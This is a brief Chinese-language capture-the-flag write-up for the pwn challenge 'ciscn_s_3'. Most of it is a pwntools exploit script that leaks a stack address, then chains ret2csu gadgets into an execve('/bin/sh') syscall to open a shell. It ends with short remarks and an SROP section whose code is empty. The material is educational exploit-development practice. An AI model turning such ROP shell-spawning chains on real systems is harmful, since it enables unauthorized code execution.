考点：ret2syscall、SROP

其实感觉没必要用 ret2csu qwq，另外这题用栈迁移也可以做，因为栈地址是知道的。

```python
from pwn import *
from sys import argv

proc = "ciscn_s_3"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("", ) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io)

vuln_addr = 0x4004ed
pop_csu_addr = 0x40059a
mov_csu_call_r12_addr = 0x400580
execve_addr = 0x4004e2
pop_rdi_ret = 0x00000000004005a3
syscall_addr = 0x0000000000400501
ret = 0x00000000004003a9
payload1 = b"a" * 16 + p64(vuln_addr)
# input()
io.send(payload1)
io.recv(0x20)
buf_addr = u64(io.recv(8)) - 0x148
log.info(f"buf_addr => {hex(buf_addr)}")
payload2 = p64(pop_rdi_ret) + b"/bin/sh\x00" + p64(pop_csu_addr) # 这里用 ret 是不行的
payload2 += p64(0) + p64(0) + p64(buf_addr) + p64(0) + p64(0) + p64(0)
payload2 += p64(mov_csu_call_r12_addr) + p64(pop_rdi_ret) + p64(buf_addr + 8)
payload2 += p64(execve_addr) + p64(syscall_addr)
io.sendline(payload2)
io.interactive()
```


一个小知识点：**`call` 指令会往栈上压入当前的下一条指令的地址，因此需要将之弹出栈**

这个题目 vuln 函数没有 `leave` 指令，所以 old_rbp 的地址就是返回地址，第一次遇到。

还有一个 SROP 解法。

```python

